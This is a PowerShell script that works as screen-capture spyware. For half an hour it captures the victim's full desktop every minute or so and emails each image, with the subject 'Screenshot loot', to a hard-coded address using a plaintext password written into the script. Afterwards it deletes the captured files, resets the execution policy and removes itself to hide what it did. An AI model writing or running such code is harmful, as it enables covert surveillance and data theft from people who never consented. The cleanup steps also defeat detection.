New-Item -Path '\Documents\Screens\' -ItemType Directory
$timer = new-timespan -Minutes 30
$clock = [diagnostics.stopwatch]::StartNew() 
while ($clock.elapsed -lt $timer){ 
[void][reflection.assembly]::loadwithpartialname('system.windows.forms') 
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen 
$Width = $Screen.Width 
$Height = $Screen.Height 
$Left = $Screen.Left 
$Top = $Screen.top 
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height 
$graphic = [System.Drawing.Graphics]::FromImage($bitmap) 
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size) 
$enddate = (Get-Date).tostring('ddMMyy-hh_mm_ss') 
$filename = $enddate + '.gif' 
$bitmap.Save('\Documents\Screens\' + $filename) 
start-sleep -seconds 10
Send-MailMessage -From daggerdark13@gmail.com -To daggerdark13@gmail.com -Subject "Screenshot loot" -Body "Please find attached your screenshot update" -Attachment "\Documents\Screens\$filename" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList daggerdark13@gmail.com, (ConvertTo-SecureString -String "Daggerdark@14" -AsPlainText -Force))
start-sleep -seconds 60 
} 
Set-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser 
Get-ChildItem Documents\Screens -Include *.* -Recurse | ForEach {$_.Delete()} 
Remove-Item Documents\screens -Confirm:$false 
Remove-Item Documents\screens.ps1 -Force 
exit
